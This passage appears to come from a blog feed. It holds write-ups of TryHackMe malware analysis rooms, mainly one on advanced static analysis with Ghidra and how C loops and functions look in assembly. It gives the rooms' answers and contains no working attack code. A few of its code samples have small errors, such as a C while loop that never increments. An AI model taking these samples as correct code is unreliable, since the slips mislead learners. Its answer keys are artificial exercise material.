onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store\C:\Users\Administrator\Desktop\samples\3.exe</code></em></p> <h2 id="task-7---conclusion">Task 7 - Conclusion</h2> <p>To conclude, in this room we have learned how to monitor a proccess’ activites using ProcMon and filter out other process to focus on the process of our interest and how to identify what API calls a process is making ot identify the behaviour of the process. Moreover, we tried to figure out if a malware asmple is trying to evade detection by performing Process Masquerading or Process Hollowing using Process Explorer, and we identified changes in the registry made by malware using Regshot.<br/> Furthermore, we must understand that malware analysis requires perseverance, persistance, and attention to details since malware authors will always try to twart an analyst’s efforts. What we have covered so far is not enough to analyze the most advanced malware, hence we will cover more advanced trick in <a href="https://tryhackme.com/r/room/advanceddynamicanalysis">Dynamic Analysis: Debugging</a>.</p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="Malware Analysis"/><category term="RE"/><category term="Dynamic Analysis"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM Advanced Static Analysis</title><link href="https://nonohm.github.io/blog/2024/THM-Advanced-Static-Analysis/" rel="alternate" type="text/html" title="THM Advanced Static Analysis"/><published>2024-06-21T19:54:45+00:00</published><updated>2024-06-21T19:54:45+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-Advanced-Static-Analysis</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-Advanced-Static-Analysis/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>Unlike in <a href="https://tryhackme.com/room/staticanalysis1">Basic Static Analysis</a> where we looked more at the characteristics of malware, like strings, hashes, import functions, and other key information; in Advanced Static Analysis, we will dig further by analyzing disassembled code and the associated assembly instructions.</p> <p>Advanced static analysis is a technique used to analyze the code and structure of malware without executing it, in order to identify the malware’s behavior and weaknesses.</p> <h3 id="learning-objectives">Learning Objectives</h3> <p>Some of the topics that are covered in this room are:</p> <ul> <li>Understand how advanced static analysis is performed.</li> <li>Exploring Ghidra’s disassembler functionality.</li> <li>Understanding and identifying different C constructs in assembly.</li> </ul> <h2 id="task-2---malware-analysis---overview">Task 2 - Malware Analysis - Overview</h2> <p>To begin with, malware analysis is the fact of examining malicious software (malware) to understand how it works and identify its capabilities, behavior and potential impact. There are four main steps in analyzing malware:</p> <ol> <li>Basic static analsis</li> <li>Basic dynamic analysis</li> <li>Advanced static analysis</li> <li>Advances dynamic analysis</li> </ol> <p>Each step uses different tools and techniques to gather information about the malware.</p> <h3 id="static-analysis">Static Analysis</h3> <p>Static analysis aims to understand the malware’s structure and behavior without executing it. Basic analysis involves examining the malware’s code, file headers and other simple static properties. Advanced analysis, on the other hand, aims to uncover hidden or obfuscated code and functionality within the malware. This involves more advanced techniques to analze the malware’s code, such as deobfuscation and code emulation.</p> <h3 id="dynamic-analysis">Dynamic Analysis</h3> <p>Dynamic analysis aims to observe the malware’s behavior during execution in a controlled environment. Basic analysis involves executing the malware in a sandbox or virtual machine and monitoring its system activity, network traffic and process behavior. Advanced analysis seeks to uncover more complex and evasive malware behiavor using advanced monitoring techniques with more sophisticated sandboxed and monitoring tools to capture it in greater detail.</p> <h3 id="how-advanced-static-analysis-is-performed-">How Advanced Static Analysis is Performed ?</h3> <p>Advanced static analysis is a crucial process for understanding its behavior and identifying its potential threats. The key objectives are to discover the malware’s capabilities, identify its attack vectors and determine the evasion techniques.</p> <p>To perform this type of analysis, dissasemblers such as IDA Pro, Binary ninja and radare2 are commonly used. These disassemblers allow the analyst to explore the malware’s assembly code/pseudo-c code and identify the functions and data structures.</p> <p>The steps involved are as follows:</p> <ol> <li>Identify the entry point of the malware and the system calls it makes.</li> <li>Identify the malware’s code sections and analyze them using available tools such as debuggers and hex editors.</li> <li>Analyze the malware’s control flow graph to identify its execution path.</li> <li>Trace the malware’s dynamic behavior by analyzing the system calls it makes during execution.</li> <li>Use the above information to understand the malware’s evasion techniques and the potential damage it can cause.</li> </ol> <h3 id="questions">Questions</h3> <p><strong>Does advanced static analysis require executing the malware in a controlled environment? (yay/nay)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">nay</code></em></p> <h2 id="task-4---ghidra-a-quick-overview">Task 4 - Ghidra: A Quick Overview</h2> <p>Many disassemblers like cutter, ghidra, radare2 ans IDA Pro can be used to disassemble any type of program. However, we will explore Ghidra because it’s free, open-source and has many features that can be utilized to get proficient in reverse engineering. The objective is to get comfortable with the main usage of a disassembler and use that knowledge to any others.</p> <p>Ghidra includes many features that make it a powerful reverse engineering tool. Some of these features include:</p> <ul> <li><strong>Decompilation</strong>: Ghidra can decompile binaries into readable C code, making it easier for developers to understand how the software works.</li> <li><strong>Disassembly</strong>: Ghidra can disassemble binaries into assembly language, allowing analysts to examine the low-level operations of the code.</li> <li><strong>Debugging</strong>: Ghidra has a built-in debugger that allows users to step through code and examine its behavior.</li> <li><strong>Analysis</strong>: Ghidra can automatically identify functions, variables, and other code to help users understand the structure of the code.</li> </ul> <h3 id="how-to-use-ghidra-for-analysis">How to use Ghidra for Analysis</h3> <p>Here, we will explore Ghidra and its features by analyzing the <code class="language-plaintext highlighter-rouge">HelloWorld.exe</code> sample.</p> <p>To begin with, open <em>Ghidra</em> and create a new project</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BySFLlIUA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Step 1 Ghidra" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Secondly, select <em>Non-Shared Project</em>. <em>Shared Project</em> is to allow us to share our analysis with other analysts.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/H1mRUgIUR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Step 2 Ghidra" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Then, name the project accordingly to our binary.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/rycGwxLUC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Step 3 Ghidra" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>When the window <em>Active Project</em> is shown, drag and drop <code class="language-plaintext highlighter-rouge">HelloWorld.exe</code> or <code class="language-plaintext highlighter-rouge">File -&gt; Import File</code> to begin the program’s analysis.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BkrcuxI8R.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Step 4 Ghidra" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Once it is imported, we get the program’s summary as shown below:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/HyslFlILC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Program Summary" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>After that, double-click on <strong>HelloWorld.exe</strong> or click on the dragon icon to open the <em>CodeBrowser</em> and re-import the file. When asked to analyze the executable, click on <strong>Yes</strong>.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/H1eHcx8UA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Open CodeBrowser" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/ryl59gULR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Analyze the sample" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>The next window that appears show us various analysis option. We can check or uncheck them based on our needs. These add-ons assist Ghidra during analysis.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/SJtmoe8UA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Analysis options" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>It will take some time to analyze. The bottom bar show the current progress.</p> <h3 id="exploring-the-ghidra-layout">Exploring the Ghidra Layout</h3> <p>Ghidra has so many options to aid in our analysis. The default layout is shown and explained briefly below.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/ByniixL8A.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Ghidra Layout" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <ol> <li><strong>Program Trees:</strong> Show the sections of the program. We can click on different sections to see the content within each. The <a href="https://tryhackme.com/room/dissectingpeheaders">Dissecting PE Headers</a> room explain headers and PE Sections in depth.</li> <li><strong>Symbol Tree:</strong> Contains important sections like Imports, Exports and Functions. Each seciton provides a wealth of information about the program we are analyzing. <ul> <li><strong>Imports:</strong> This section contains information about the libraries being imported by te program. Clicking on each API call shows the assembly code that uses that API.</li> <li><strong>Exports:</strong> This section contains the API/function calls being exported by the program. This section is useful when analyzing a DLL, as it will show all the functions it contains.</li> <li><strong>Functions:</strong> This section contains the functions it finds within the code. Clicking on each function will take us to the disassembled code of that function. It also contains the entry function. Clicking on the <em>entry</em> function will take us to the start of the program we are analyzing. Functions with generic names starting with <code class="language-plaintext highlighter-rouge">FUN_VirtualAddress</code> are the ones that Gidra does not give any names to.</li> </ul> </li> <li><strong>Data Type Manager:</strong> This section shows various data types found in the program.</li> <li><strong>Listing:</strong> This window show the dissassembled code of the binary, which included the following values in order: <ul> <li>Virtual Address</li> <li>Opcode</li> <li>Assembly Instrcution (<em>PUSH</em>, <em>POP</em>, <em>ADD</em>, <em>XOR</em>, etc…)</li> <li>Operands</li> <li>Comments</li> </ul> </li> <li><strong>Decompile:</strong> Ghidra translates the assembly code into a pseudo C code here. This is a very important section to look at during analysis as it gives a better understanding of the assembly code.</li> <li><strong>Toolbar:</strong> Various options to use during the analysis.</li> </ol> <ul> <li><strong>Graph View:</strong> The Graph View in the toolbar is an important option, allowing us to see the graph view of the disassembly.</li> </ul> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/SJpdkWL8C.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Main function Graph" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <ul> <li><strong>The Memory Map</strong> option shows the memory mapping of the program as shown below:</li> </ul> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/H1cq1-IUC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Memory Map" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <ul> <li>This navigation toolbar shows different options to navigate through the code.</li> </ul> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/ByPel-880.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Toolbar" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <ul> <li>To explore strings, go to <code class="language-plaintext highlighter-rouge">Search -&gt; For Strings</code> and click <em>Search</em> will give us the strings that Ghidra finds withing the binary. This window can contain important information to help us.</li> </ul> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/H1-8xWLUA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="String Search Window" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="analyzing-helloworld-in-assembly">Analyzing HelloWorld in Assembly</h3> <p>There are many ways to reach the code of interest. To find the assembly code for <strong>HelloWorld.exe</strong>, we will go for a String Search to see where is our string <em>Hello World</em>.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/HJNbtZUL0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Hello World decompiled" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>The search has returned the code block of the MessageBox call using the <em>Hello World</em> string. We may notice that the main function is filled with compiler things.</p> <p>We explored Ghidra and its features in this task by examining a simple “HelloWorld” program. In the next task, we will use this knowledge to explore different C constructs and their corresponding representations in assembly.</p> <blockquote> <p><strong>Note:</strong> It is trivial to note that the malware’s author may have packed it or used obfuscation or Anti VM / AV detection techniques to make the analysis harder. These techniques will be discussed in the coming rooms.</p> </blockquote> <h3 id="questions-1">Questions</h3> <p><strong>How many function calls are present in the Exports section?</strong></p> <p>The only exported function is called <em>entry</em>. However, this is not our main function like depicted above.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/r14zqWUUR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="HelloWorld exports" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>What is the only API call found in the User32.dll under the Imports section?</strong></p> <p>The only API call for <em>User32.dll</em> is the <code class="language-plaintext highlighter-rouge">MessageBoxA</code> function.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/S17O5-LLC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="MessageBoxA import" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">MessageBoxA</code></em></p> <p><strong>How many times can the “Hello World” string be found with the Search for Strings utility?</strong></p> <p>Like shown before, the <em>Hello World</em> string is only found one time in the <code class="language-plaintext highlighter-rouge">Search -&gt; For Strings</code> menu.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/ry_yjZIUC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="String Search" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>What is the virtual address of the CALL function that displays “Hello World” in a messagebox?</strong></p> <p>By double-clicking on the <em>Code Unit</em> case of the string search, we can go to the location of the string <em>Hello World</em>.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BJJDh-LUA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Hello World string" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Once that is done, double-clicking on the parent function (XREF), we are welcomed with the disassembly of the main function, containing <code class="language-plaintext highlighter-rouge">MessageBoxA</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BJK23WLIR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="MessageBoxA function call" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">004073d7</code></em></p> <h2 id="task-5---identifying-c-code-constructs-in-assembly">Task 5 - Identifying C Code Constructs in Assembly</h2> <p>Analyzing assembly code of compiled binaries can be overwhelming for beginners. That is why understanding assembly instructions and how various programming components are translated into assembly is important.</p> <p>We are loading components of the <code class="language-plaintext highlighter-rouge">Code_Constructs</code> into Ghidra.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BkxJZuAP0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Code_Constructs in Ghidra" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>There are different approaches to begin analyzing the code:</p> <ul> <li>Locate the main function from the <strong>Symbol Tree</strong> section.</li> <li>Check the <strong>.text</strong> code from the <strong>Program Trees</strong> section to see the ode section and find the entry point.</li> <li>Search for interesting <strong>strings</strong> and locate the code from where those are referenced.</li> </ul> <blockquote> <p><strong>Note:</strong> Different compilers add their own code for various checks while compiling. Therefore expect some garbage assembly code that does not make sense.</p> </blockquote> <h3 id="code-hello-world">Code: Hello World</h3> <p><strong>In C language</strong></p> <p>The <em>Hello World</em> program is one of the most basic program to try out a new language.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="n">main</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Hello World</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><strong>In Assembly</strong></p> <pre><code class="language-asm">section .data 
    message db 'HELLO WORLD!!', 0 ; Defines the string "HELLO WORLD!!" followed by a null byte in memory

section .text
    global _start

_start:
    ; write the message to stdout
    mov eax, 4      ; write system call
    mov ebx, 1      ; file descriptor for stdout
    mov ecx, message    ; pointer to message
    mov edx, 13     ; message length
    int 0x80        ; call kernel
</code></pre> <p>This program defines a string “HELLO WORLD!!” in the .data section and then uses the write system call to print the string to stdout.</p> <p><strong>In Ghidra</strong></p> <p>The <em>Hello World</em> code can be found by doing a string search.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/S1Xar9RPC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="String Search" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BJmGLqAwA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="First occurence" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BJiNIcAD0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Main function" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>We know that function is the main function, hence we can rename our function on the <em>decompiler</em> section.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/Sk408q0PR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Typed main" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="code-for-loop">Code: For Loop</h3> <p><strong>In C Language</strong></p> <p>A For loop permit to repeat certain instructions until it completes.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">5</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">i</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><strong>In Assembly</strong></p> <pre><code class="language-asm">main:
    ; initialize loop counter to 0
    mov ecx, 0

    ; loop 5 times
    mov edx, 5
loop:
    ; print the loop counter
    push ecx
    push format
    call printf
    add esp, 8

    ; increment loop counter
    inc ecx

    ; check if the loop is finished
    cmp ecx, edx
    jl loop
</code></pre> <p><strong>In Ghidra</strong></p> <p>The <code class="language-plaintext highlighter-rouge">for-loop.exe</code> is the program which contains the loop code.</p> <p>This is its behaviour:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop\Code_Constructs</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\for-loop.exe</span><span class="w">
</span><span class="n">This</span><span class="w"> </span><span class="nx">program</span><span class="w"> </span><span class="nx">demonstrates</span><span class="w"> </span><span class="nx">FOR</span><span class="w"> </span><span class="nx">loop</span><span class="w"> </span><span class="nx">statement</span><span class="w">
</span><span class="n">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="nx">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="n">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="nx">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="n">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="nx">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="n">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="nx">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="n">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="nx">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="n">THM_IS_Fun_to_Learn</span><span class="w">
</span></code></pre></div></div> <p>On Ghidra, we can get the main function a bit after the entry point. Moreover, we get the decompiled pseudo-C code of the for loop.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/rklzoazuC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Ghidra for loop" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="code-function">Code: Function</h3> <p><strong>In C Language</strong></p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">add</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><strong>In Assembly</strong></p> <pre><code class="language-asm">add:
    push ebp          ; save the current base pointer value
    mov ebp, esp      ; set base pointer to current stack pointer value
    mov eax, dword ptr [ebp+8]  ; move the value of 'a' into the eax register
    add eax, dword ptr [ebp+12] ; add the value of 'b' to the eax register
    mov dword ptr [ebp-4], eax  ; move the sum into the 'result' variable
    mov eax, dword ptr [ebp-4]  ; move the value of 'result' into the eax register
    pop ebp           ; restore the previous base pointer value
    ret               ; return to calling function
</code></pre> <p>The add function starts by saving the current base pointer value onto the stack. Then, it sets the base pointer to the current stack pointer value. The function then moves the values of <em>a</em> and <em>b</em> into the <em>eax</em> register, adds them, and store the result in the <em>result</em> variable. Finally, the function moves the value of the result into the <em>eax</em> register, restores the previous base pointer value, and returns to the calling function.</p> <h3 id="code-while-loop">Code: While loop</h3> <p><strong>In C Language</strong></p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <p><strong>In Assembly</strong></p> <pre><code class="language-asm">mov ecx, 0     ; initialize i to 0
loop_start:
cmp ecx, 10    ; compare i to 10
jge loop_end   ; jump to loop_end if i &gt;= 10
push ecx       ; save the value of i on the stack
push format    ; push the format string for printf
push dword [ecx]; push the value of i for printf
call printf    ; call printf to print the value of i
add esp, 12    ; clean up the stack
inc ecx        ; increment i
jmp loop_start ; jump back to the start of the loop
loop_end:
</code></pre> <p><strong>In Ghidra</strong></p> <p>Using the provided program, Ghidra seems to interpret the while loop as a for loop one. This is maybe due also on how has compiled the source code.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/By4qVAGOC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Ghidra while loop" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>This is how it should look like:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/SkI6ECM_A.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Ghidra while loop ok" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><strong>Task: Examine the if-else.exe and while-loop.exe and answer the questions below.</strong></p> <h3 id="questions-2">Questions</h3> <p><strong>What value gets printed by the while loop in the while-loop.exe program?</strong></p> <p>We can run the program or look at what data gets <em>printf</em>.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_puts</span><span class="p">(</span><span class="s">"_ITs_Fun_to_Learn_at_THM_"</span><span class="p">);</span>
</code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">_ITs_Fun_to_Learn_at_THM_</code></em></p> <p><strong>How many times, the while loop will run until the condition is met?</strong></p> <p>From the decompiled code, this is what we get:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">for</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">local_14</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="n">local_14</span> <span class="o">=</span> <span class="n">local_14</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">_puts</span><span class="p">(</span><span class="s">"_ITs_Fun_to_Learn_at_THM_"</span><span class="p">);</span>
  <span class="p">}</span>
</code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">4</code></em></p> <p><strong>Examine the while-loop.exe in Ghidra. What is the virtual address of the instruction, that CALLS to print out the sentence “That’s the end of while loop ..”?</strong></p> <p>For this question, we need to check where the call for the <em>printf</em> function is made:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BJg9LCzdA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="printf end of the wile loop" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">00401543</code></em></p> <p><strong>In the if-else.exe program, examine the strings and complete the sentence “This program demonstrates………..”</strong></p> <p>Here, we can use the <em>String Search</em> function of Ghidra:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/B1g9DAzOA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="String if-else" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">This program demonstrates if-else statement </code></em></p> <p><strong>What is the virtual address of the CALL to the main function in the if-else.exe program?</strong></p> <p>This information is contained at the line of <code class="language-plaintext highlighter-rouge">_main()</code>:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/By0fdAz_R.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="_main() function call" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">00401509</code></em></p> <h2 id="task-6---an-overview-of-windows-api-calls">Task 6 - An Overview of Windows API Calls</h2> <p>The Windows API is a collection of functions and services to enable developers to create Windows applications.</p> <h3 id="create-process-api">Create Process API</h3> <p><code class="language-plaintext highlighter-rouge">CreateProcessA</code> is a function which creates a new process and its primary thread.</p> <p><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcessA</a></p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">CreateProcessA</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPCSTR</span>                <span class="n">lpApplicationName</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPSTR</span>                 <span class="n">lpCommandLine</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpProcessAttributes</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpThreadAttributes</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">BOOL</span>                  <span class="n">bInheritHandles</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">DWORD</span>                 <span class="n">dwCreationFlags</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPVOID</span>                <span class="n">lpEnvironment</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPCSTR</span>                <span class="n">lpCurrentDirectory</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">LPSTARTUPINFOA</span>        <span class="n">lpStartupInfo</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span>               <span class="n">LPPROCESS_INFORMATION</span> <span class="n">lpProcessInformation</span>
<span class="p">);</span>
</code></pre></div></div> <p>This C code uses <code class="language-plaintext highlighter-rouge">CreateProcessA</code> to launch a new process:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
